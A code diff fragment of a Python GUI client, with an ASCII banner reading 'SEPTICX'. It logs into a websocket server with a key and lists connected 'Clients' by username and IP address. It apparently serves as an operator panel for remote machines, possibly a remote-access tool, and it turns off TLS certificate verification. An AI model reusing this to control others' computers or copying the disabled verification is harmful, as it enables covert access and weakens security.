+            .split('/')[0]
+
+        try:
+            ws = create_connection(f"wss://{server_address}/api/ws/computers", sslopt={"cert_reqs": ssl.CERT_NONE})
+        except (websocket.WebSocketException, ValueError) as e:
+            label.configure(text='Invalid Server Address')
+            print(e)
+            return
+
+        ws.send(server_key)
+        time.sleep(1)
+
+        try:
+            self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
+        except (websocket.WebSocketException, ValueError, json.JSONDecodeError) as e:
+            label.configure(text='Invalid Server Key')
+            return
+
+        if not (ws.connected):
+            label.configure(text='Invalid Server Key')
+            return
+
+        self.ws = ws
+        self.server_key = server_key
+        self.server_address = server_address
+
+        label.configure(text='Success!')
+
+        for child in self.winfo_children()[1:]:
+            child.destroy()
+
+        threading.Thread(target=self.update_computers).start()
+        self.menu()
+
+    def update_computers(self):
+        global ws
+        ws = self.ws
+
+        while True:
+            try:
+                self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
+            except (json.JSONDecodeError, websocket.WebSocketException, TypeError) as e:
+                try:
+                    ws = create_connection(f"wss://{self.server_address}/api/ws/computers")
+                    ws.send(self.server_key)
+                except (json.JSONDecodeError, websocket.WebSocketException) as e:
+                    pass
+
+            self.ws = ws
+
+    def update_profiles(self, main_frame, computers=[]):
+        if computers == self.computers:
+            self.after(10000, self.update_profiles, main_frame, computers)
+            return
+
+        computers = list(self.computers)
+
+        for child in main_frame.winfo_children()[1:]:
+            child.destroy()
+
+        for computer in self.computers:
+
+            username, ip_address = computer.split('|')
+            config = {"username": username, "ip_address": ip_address}
+            Profile(master=main_frame, parent=self, config=config, row=1, rowspan=1, pady=1)
+
+        self.after(0, self.update_profiles, main_frame, computers)
+
+    def menu(self):
+        main_frame = customtkinter.CTkScrollableFrame(self, label_text="Clients")
+
+        for i in range(15): # Set 15 rows
+            main_frame.rowconfigure(i, weight=1)
+        
+        for i in range(15): # Set 15 columns
+            main_frame.columnconfigure(i, weight=1)
+
+        main_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        Profile(master=main_frame, title=True, pady=1)
+
+        self.after(0, self.update_profiles, main_frame)
+
+    @staticmethod
+    def banner():
+        print(fade.greenblue("""
+   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
+  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
+  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
+  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
+▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
+         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
+   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
+ ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
+        """))
+
+if __name__ == "__main__":
+    app = App()
+    app.mainloop()
